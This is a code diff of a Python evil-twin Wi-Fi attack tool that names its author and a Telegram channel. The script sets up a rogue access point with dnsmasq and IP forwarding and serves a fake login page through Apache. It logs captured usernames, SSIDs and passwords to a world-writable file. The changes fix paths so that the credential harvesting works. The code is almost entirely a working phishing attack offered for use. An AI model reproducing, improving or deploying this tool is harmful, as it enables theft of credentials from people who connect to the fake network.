@@ -30,7 +30,7 @@ class DF_Evil_Twin:
 
     def setup_dhcp_server(self):
         with open("dnsmasq.conf", "w") as f:
-            f.write("interface=" + self.interface + "\ndhcp-range=192.168.1.2,192.168.1.100,12h\n")
+            f.write(f"interface={self.interface}\ndhcp-range=192.168.1.2,192.168.1.100,12h\n")
         os.system("dnsmasq -C dnsmasq.conf &")
 
     def enable_ip_forwarding(self):
@@ -47,13 +47,16 @@ def setup_fake_login(ssid):
     os.system("sudo cp index.html /var/www/html/index.html")
     os.system("sudo cp login.php /var/www/html/login.php")
     os.system(f"echo '<script>window.location.href += \"?ssid={ssid}\";</script>' >> /var/www/html/index.html")
+    os.system("sudo touch /var/www/html/log.txt")
     os.system("sudo chmod 777 /var/www/html/log.txt")
     os.system("sudo service apache2 restart")
 
 def save_to_php(username, ssid, password):
-    data = f"Username: {username} | Network: {ssid} | Password: {password}\n"
-    with open("data.php", "a") as file:
-        file.write(f"<?php\nfile_put_contents('log.txt', '{data}', FILE_APPEND);\n?>")
+    data = f"Username: {username} | Network: {ssid} | Password: {password}\\n"
+    if not os.path.exists("/var/www/html/log.txt"):
+        open("/var/www/html/log.txt", "w").close()
+    with open("/var/www/html/data.php", "a") as file:
+        file.write(f"<?php\nfile_put_contents('/var/www/html/log.txt', '{data}', FILE_APPEND);\n?>")
 
 if __name__ == "__main__":
     print("\n[+] DF Evil Twin Attack Tool by @A_Y_TR\n[+] Channel: https://t.me/cybersecurityTemDF")
